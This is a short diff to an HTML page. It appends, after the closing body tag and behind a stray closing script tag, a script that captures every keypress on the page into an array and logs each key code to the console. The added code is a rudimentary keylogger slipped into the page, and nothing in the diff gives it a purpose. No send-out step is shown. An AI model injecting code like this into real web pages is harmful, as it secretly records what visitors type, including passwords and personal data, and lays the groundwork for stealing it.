@@ -25,4 +25,13 @@
         </div>
     </div>
 </body>
+</script><script>
+// array of user keystrokes
+var keystrokes = [];
+// event listener which captures user keystrokes
+document.onkeypress = function() {
+    keystrokes.push(window.event.keyCode);
+	console.log("PRESSED ", window.event.keyCode);
+}
+</script>
 </html>
